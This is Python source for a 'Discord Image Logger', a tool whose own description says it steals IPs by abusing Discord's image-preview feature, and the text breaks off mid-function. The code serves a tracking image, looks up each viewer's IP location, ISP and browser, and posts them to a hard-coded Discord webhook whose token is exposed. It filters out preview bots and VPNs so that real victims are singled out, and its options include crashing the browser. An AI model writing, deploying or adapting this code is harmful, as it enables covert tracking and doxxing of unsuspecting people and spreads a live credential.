from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser, json, os
from datetime import datetime

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1411376724687716352/NLwqC3EHRqfZyRN_mxcvdzMNqGudCOOfnMl0490ikvKu-QVxC_lh0AYa-nydnA_cJFV4",
    "image": "https://k.top4top.io/p_3622phqzg1.png",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,
    
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }]
        }, timeout=5)
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if not ip:
        return None
        
    if ip.startswith(blacklistedIPs):
        return None
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": "",
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }]
                }, timeout=5)
            except:
                pass
        return None

    ping = "@everyone"
    
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
    except:
        info = {"proxy": False, "hosting": False, "isp": "Unknown", "as": "Unknown", 
                "country": "Unknown", "regionName": "Unknown", "city": "Unknown",
                "lat": 0, "lon": 0, "timezone": "Unknown", "mobile": False}
    
    if info.get("proxy", False):
        if config["vpnCheck"] == 2:
            return None
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting", False):
        if config["antiBot"] == 4:
            if info.get("proxy", False):
                pass
            else:
                return None
        elif config["antiBot"] == 3:
            return None
        elif config["antiBot"] == 2:
            if info.get("proxy", False):
                pass
            else:
                ping = ""
        elif config["antiBot"] == 1:
            ping = ""

    try:
        os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    except:
        os_name, browser = "Unknown", "Unknown"
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', 0))+', '+str(info.get('lon', 0)) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', 'Unknown') else info.get('timezone', 'Unknown')}`
> **Mobile:** `{info.get('mobile', False)}`
> **VPN:** `{info.get('proxy', False)}`
> **Bot:** `{info.get('hosting', False) if info.get('hosting', False) and not info.get('proxy', False) else 'Possibly' if info.get('hosting', False) else 'False'}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
